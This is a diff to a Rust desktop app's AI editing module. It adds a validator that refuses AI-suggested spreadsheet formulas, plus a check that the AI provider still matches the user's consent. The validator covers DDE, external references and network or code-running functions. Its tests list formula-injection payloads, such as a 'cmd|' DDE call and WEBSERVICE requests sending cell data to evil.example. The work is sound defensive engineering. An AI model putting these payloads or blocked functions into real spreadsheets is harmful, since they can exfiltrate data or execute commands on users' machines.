@@ -8,7 +8,7 @@
 
 use super::{ai_error, build_config, emit_chunk, emit_progress, emit_reasoning};
 use crate::jobs::JobRegistry;
-use aicore::{AiError, ChatMessage, ChatOptions, DeepSeekClient};
+use aicore::{AiConfig, AiError, ChatMessage, ChatOptions, DeepSeekClient, ProviderKind};
 use pdfcore::error::{ErrorCode, PdfError};
 use serde::{Deserialize, Serialize};
 use tauri::{AppHandle, State};
@@ -27,7 +27,10 @@ pub const MAX_SLIDES: usize = 30;
 const MAX_BULLETS_PER_SLIDE: usize = 12;
 const MAX_TITLE_CHARS: usize = 200;
 const MAX_BULLET_CHARS: usize = 500;
-const MAX_FORMULA_CHARS: usize = 2_000;
+const MAX_FORMULA_CHARS: usize = 1_000;
+/// Extra output tokens on top of half the input size: room for the model's
+/// own reasoning and for a reply that is longer than its input (translation).
+const EDIT_TOKEN_HEADROOM: usize = 2_048;
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
 #[serde(rename_all = "snake_case")]
@@ -64,6 +67,11 @@ pub struct AiEditRequest {
     #[serde(default)]
     pub options: EditOptions,
     pub job_id: String,
+    /// Provider id the user saw in the consent step. The request is refused if
+    /// the saved settings now point somewhere else.
+    pub expected_provider: String,
+    /// Host (with a non-default port) the user saw in the consent step.
+    pub expected_host: String,
 }
 
 /// Manual `Debug`: the selected document text and the context must never end
@@ -75,6 +83,8 @@ impl std::fmt::Debug for AiEditRequest {
             .field("text", &format_args!("<{} chars>", self.text.chars().count()))
             .field("options", &self.options)
             .field("job_id", &self.job_id)
+            .field("expected_provider", &self.expected_provider)
+            .field("expected_host", &self.expected_host)
             .finish()
     }
 }
@@ -241,7 +251,105 @@ fn strip_fence(value: &str) -> &str {
     }
 }
 
-/// Validates a `suggest_formula` reply: one line, starting with `=`.
+/// Functions a suggested formula may never call: they reach the network, run
+/// external code or leak local information (`CELL("filename")` is handled
+/// separately because other `CELL` queries are harmless).
+const BLOCKED_FUNCTIONS: &[&str] = &["WEBSERVICE", "FILTERXML", "HYPERLINK", "CALL", "REGISTER", "RTD", "INFO"];
+
+/// Every function call outside string literals as `(NAME, first argument)`.
+/// A name that carries a prefix (`_xlfn.WEBSERVICE`) is reduced to its last
+/// segment.
+fn function_calls(formula: &str) -> Vec<(String, String)> {
+    let chars: Vec<char> = formula.chars().collect();
+    let mut calls = Vec::new();
+    let mut index = 0;
+    let mut in_string = false;
+    while index < chars.len() {
+        let ch = chars[index];
+        if ch == '"' {
+            in_string = !in_string;
+            index += 1;
+            continue;
+        }
+        if in_string || !(ch.is_alphabetic() || ch == '_') {
+            index += 1;
+            continue;
+        }
+        let start = index;
+        while index < chars.len() && (chars[index].is_alphanumeric() || matches!(chars[index], '_' | '.')) {
+            index += 1;
+        }
+        let name: String = chars[start..index].iter().collect();
+        let mut after = index;
+        while after < chars.len() && chars[after].is_whitespace() {
+            after += 1;
+        }
+        if chars.get(after) != Some(&'(') {
+            continue;
+        }
+        let last = name.rsplit('.').next().unwrap_or(&name).to_uppercase();
+        calls.push((last, first_argument(&chars[after + 1..])));
+    }
+    calls
+}
+
+/// Text of the first argument (up to the first top-level `,` or the closing
+/// `)`), string literals and nested parentheses respected.
+fn first_argument(chars: &[char]) -> String {
+    let mut depth = 0usize;
+    let mut in_string = false;
+    let mut out = String::new();
+    for &ch in chars {
+        if ch == '"' {
+            in_string = !in_string;
+        } else if !in_string {
+            match ch {
+                '(' => depth += 1,
+                ')' if depth == 0 => break,
+                ')' => depth -= 1,
+                ',' if depth == 0 => break,
+                _ => {}
+            }
+        }
+        out.push(ch);
+    }
+    out.trim().to_string()
+}
+
+/// Rejects formulas that could exfiltrate data or run code when the user
+/// opens the sheet in another spreadsheet program.
+fn check_formula_safety(formula: &str) -> Result<(), PdfError> {
+    let unsafe_formula = |what: &str| invalid(format!("The suggested formula was refused because it uses {what}."));
+    if formula.contains('|') {
+        return Err(unsafe_formula("a DDE-style call (`|`)"));
+    }
+    if let Some(open) = formula.find('[') {
+        if formula[open..].contains(']') {
+            return Err(unsafe_formula("an external workbook reference (`[...]`)"));
+        }
+    }
+    for (name, first_argument) in function_calls(formula) {
+        if BLOCKED_FUNCTIONS.contains(&name.as_str()) {
+            return Err(unsafe_formula(&format!("the function {name}")));
+        }
+        if name == "CELL" {
+            let literal = first_argument
+                .strip_prefix('"')
+                .and_then(|rest| rest.strip_suffix('"'))
+                .filter(|inner| !inner.contains('"'));
+            // `CELL("filename")` reveals the local file path, and a computed
+            // first argument could spell it out, so only plain literals pass.
+            match literal {
+                Some(info_type) if !info_type.trim().eq_ignore_ascii_case("filename") => {}
+                _ => return Err(unsafe_formula("CELL(\"filename\")")),
+            }
+        }
+    }
+    Ok(())
+}
+
+/// Validates a `suggest_formula` reply: one line, starting with `=`, free of
+/// DDE, external references and network/code-running functions.
 pub fn validate_formula(reply: &str) -> Result<String, PdfError> {
     let unfenced = strip_fence(reply);
     let formula = unfenced.trim().trim_matches('`').trim();
@@ -254,6 +362,7 @@ pub fn validate_formula(reply: &str) -> Result<String, PdfError> {
     if formula.chars().count() > MAX_FORMULA_CHARS {
         return Err(invalid("The suggested formula is too long."));
     }
+    check_formula_safety(formula)?;
     Ok(formula.to_string())
 }
 
@@ -319,6 +428,58 @@ pub fn validate_reply(task: EditTask, reply: &str) -> Result<(String, Option<Vec
     }
 }
 
+/// Output budget for an edit: at least the configured limit, and enough for a
+/// reply about as long as the input (half the input characters, tokens being
+/// roughly two to four characters) plus headroom; never above what the
+/// provider accepts.
+pub fn edit_max_tokens(config: &AiConfig, input_chars: usize) -> u32 {
+    let wanted = u32::try_from(input_chars / 2 + EDIT_TOKEN_HEADROOM).unwrap_or(u32::MAX);
+    let cap = if config.provider == ProviderKind::Anthropic {
+        aicore::anthropic::ANTHROPIC_MAX_OUTPUT_TOKENS
+    } else {
+        aicore::MAX_OUTPUT_TOKENS
+    };
+    config.max_tokens.max(wanted).min(cap)
+}
+
+/// `scheme://host[:port]` reduced to the `host[:port]` the UI shows (the same
+/// text as JavaScript's `URL.host`).
+fn host_of(base_url: &str) -> String {
+    reqwest::Url::parse(base_url.trim())
+        .ok()
+        .and_then(|url| {
+            let host = url.host_str()?.to_ascii_lowercase();
+            Some(match url.port() {
+                Some(port) => format!("{host}:{port}"),
+                None => host,
+            })
+        })
+        .unwrap_or_default()
+}
+
+/// Refuses the request when the saved provider or host differ from what the
+/// user consented to (settings changed in another window meanwhile).
+fn check_expected_target(config: &AiConfig, expected_provider: &str, expected_host: &str) -> Result<(), PdfError> {
+    let provider_matches = ProviderKind::parse(expected_provider) == Some(config.provider);
+    let host_matches = host_of(&config.base_url) == expected_host.trim().to_ascii_lowercase();
+    if provider_matches && host_matches {
+        Ok(())
+    } else {
+        Err(PdfError::coded(
+            ErrorCode::InvalidInput,
+            "The AI provider settings changed after you confirmed what would be sent. Close this dialog and try again.",
+        ))
+    }
+}
+
+/// Truncation gets its own message; everything else keeps the shared mapping.
+fn edit_error(error: AiError) -> PdfError {
+    match error {
+        AiError::Truncated(_) => invalid("The answer was cut off; try a shorter selection."),
+        other => ai_error(other),
+    }
+}
+
 #[tauri::command]
 pub async fn ai_edit_text(
     app: AppHandle,
@@ -329,7 +490,10 @@ pub async fn ai_edit_text(
     validate_input(&request)?;
     let (cancel, mut job_guard) = registry.register_ai_managed(&request.job_id);
     let config = build_config(&app)?;
+    check_expected_target(&config, &request.expected_provider, &request.expected_host)?;
     let model = config.model.clone();
+    let input_chars = request.text.chars().count() + request.options.context.as_ref().map_or(0, |c| c.chars().count());
+    let max_tokens = edit_max_tokens(&config, input_chars);
     let client = DeepSeekClient::new(config).map_err(ai_error)?;
     let messages = build_messages(&request);
 
@@ -339,13 +503,13 @@ pub async fn ai_edit_text(
     let reply = client
         .chat_stream(
             &messages,
-            ChatOptions { temperature: Some(temperature(request.task)), max_tokens: None },
+            ChatOptions { temperature: Some(temperature(request.task)), max_tokens: Some(max_tokens) },
             &cancel,
             &mut on_delta,
             &mut on_reasoning,
         )
         .await
-        .map_err(ai_error)?;
+        .map_err(edit_error)?;
     let (text, slides) = validate_reply(request.task, &reply)?;
     emit_progress(&app, &request.job_id, "edit", 1, 1);
     job_guard.succeed();
@@ -357,7 +521,14 @@ mod tests {
     use super::*;
 
     fn request(task: EditTask, text: &str) -> AiEditRequest {
-        AiEditRequest { task, text: text.into(), options: EditOptions::default(), job_id: "job".into() }
+        AiEditRequest {
+            task,
+            text: text.into(),
+            options: EditOptions::default(),
+            job_id: "job".into(),
+            expected_provider: "deepseek".into(),
+            expected_host: "api.deepseek.com".into(),
+        }
     }
 
     #[test]
@@ -373,11 +544,18 @@ mod tests {
     #[test]
     fn deserializes_snake_case_tasks() {
         let req: AiEditRequest =
-            serde_json::from_str(r#"{"task":"outline_to_slides","text":"a","options":{"language":"tr"},"jobId":"j"}"#)
+            serde_json::from_str(r#"{"task":"outline_to_slides","text":"a","options":{"language":"tr"},"jobId":"j","expectedProvider":"ollama","expectedHost":"localhost:11434"}"#)
                 .expect("request");
+        assert_eq!(req.expected_provider, "ollama");
+        assert_eq!(req.expected_host, "localhost:11434");
         assert_eq!(req.task, EditTask::OutlineToSlides);
         assert_eq!(req.options.language.as_deref(), Some("tr"));
-        assert!(serde_json::from_str::<AiEditRequest>(r#"{"task":"nope","text":"a","jobId":"j"}"#).is_err());
+        assert!(serde_json::from_str::<AiEditRequest>(
+            r#"{"task":"nope","text":"a","jobId":"j","expectedProvider":"ollama","expectedHost":"h"}"#
+        )
+        .is_err());
+        // The consented provider is mandatory: a request without it is refused.
+        assert!(serde_json::from_str::<AiEditRequest>(r#"{"task":"fix","text":"a","jobId":"j"}"#).is_err());
     }
 
     #[test]
@@ -445,6 +623,87 @@ mod tests {
         assert!(validate_formula("=SUM(A1)\n=SUM(A2)").is_err());
         assert!(validate_formula("=").is_err());
         assert!(validate_formula("").is_err());
+        let long = format!("=1{}", "+1".repeat(MAX_FORMULA_CHARS));
+        assert!(validate_formula(&long).is_err());
+    }
+
+    #[test]
+    fn dangerous_formulas_are_refused() {
+        for bad in [
+            "=cmd|' /C calc'!A0",
+            "=SUM(A1)|x",
+            "=[Book2.xlsx]Sheet1!A1",
+            "='C:\\dir\\[Book2.xlsx]Sheet1'!A1",
+            "=WEBSERVICE(\"http://evil.example/?\"&A1)",
+            "=webservice (\"http://evil.example\")",
+            "=_xlfn.WEBSERVICE(A1)",
+            "=FILTERXML(A1,\"//x\")",
+            "=HYPERLINK(\"http://evil.example\",\"click\")",
+            "=1+CALL(\"kernel32\",\"x\")",
+            "=REGISTER(\"a\")",
+            "=RTD(\"srv\",,\"t\")",
+            "=INFO(\"directory\")",
+            "=CELL(\"filename\")",
+            "=CELL(\"FileName\",A1)",
+            "=CELL(\"file\"&\"name\")",
+            "=CELL(A1)",
+        ] {
+            assert!(validate_formula(bad).is_err(), "{bad} must be refused");
+        }
+        for good in [
+            "=SUM(B2:B9)",
+            "=CELL(\"address\",A1)",
+            "=IF(A1>0,\"call(me)\",\"info(x)\")",
+            "=\"a\"&\"[b]\"",
+            "=VLOOKUP(A2,Sheet2!A:B,2,FALSE)",
+            "=NETWORKDAYS.INTL(A1,B1)",
+            "=SUMIF(A:A,\"x\",B:B)",
+        ] {
+            // String contents are inert, except that `[...]` and `|` stay
+            // refused anywhere, to be conservative.
+            let expected_ok = !good.contains("[b]");
+            assert_eq!(validate_formula(good).is_ok(), expected_ok, "{good}");
+        }
+    }
+
+    fn config_for(provider: ProviderKind, max_tokens: u32) -> AiConfig {
+        AiConfig { provider, max_tokens, base_url: "https://api.deepseek.com".into(), ..Default::default() }
+    }
+
+    #[test]
+    fn output_budget_scales_with_the_input_and_respects_the_provider_cap() {
+        let deepseek = config_for(ProviderKind::DeepSeek, 4096);
+        assert_eq!(edit_max_tokens(&deepseek, 100), 4096);
+        assert_eq!(edit_max_tokens(&deepseek, 20_000), 20_000 / 2 + 2048);
+        assert_eq!(edit_max_tokens(&config_for(ProviderKind::DeepSeek, 9000), 100), 9000);
+        assert_eq!(edit_max_tokens(&config_for(ProviderKind::DeepSeek, 400_000), 100), aicore::MAX_OUTPUT_TOKENS);
+        let claude = config_for(ProviderKind::Anthropic, 100_000);
+        assert_eq!(edit_max_tokens(&claude, 100), aicore::anthropic::ANTHROPIC_MAX_OUTPUT_TOKENS);
+        assert_eq!(edit_max_tokens(&config_for(ProviderKind::Anthropic, 4096), MAX_EDIT_CHARS), 32_048);
+    }
+
+    #[test]
+    fn truncation_has_a_clear_message() {
+        let error = edit_error(AiError::Truncated("Anthropic (Claude)".into()));
+        assert!(error.to_string().contains("The answer was cut off; try a shorter selection."), "{error}");
+        assert_eq!(edit_error(AiError::Cancelled).code(), ErrorCode::Cancelled);
+    }
+
+    #[test]
+    fn requests_are_refused_when_the_provider_or_host_changed_since_consent() {
+        let mut config = config_for(ProviderKind::DeepSeek, 4096);
+        assert!(check_expected_target(&config, "deepseek", "api.deepseek.com").is_ok());
+        assert!(check_expected_target(&config, " DeepSeek ", "API.deepseek.com").is_ok());
+        assert!(check_expected_target(&config, "anthropic", "api.deepseek.com").is_err());
+        assert!(check_expected_target(&config, "deepseek", "api.anthropic.com").is_err());
+        assert!(check_expected_target(&config, "", "").is_err());
+        config.provider = ProviderKind::Ollama;
+        config.base_url = "http://localhost:11434".into();
+        assert!(check_expected_target(&config, "ollama", "localhost:11434").is_ok());
+        assert!(check_expected_target(&config, "ollama", "localhost:9999").is_err());
+        config.provider = ProviderKind::OpenAiCompatible;
+        config.base_url = "https://api.openai.com/v1".into();
+        assert!(check_expected_target(&config, "openai_compatible", "api.openai.com").is_ok());
     }
 
     #[test]
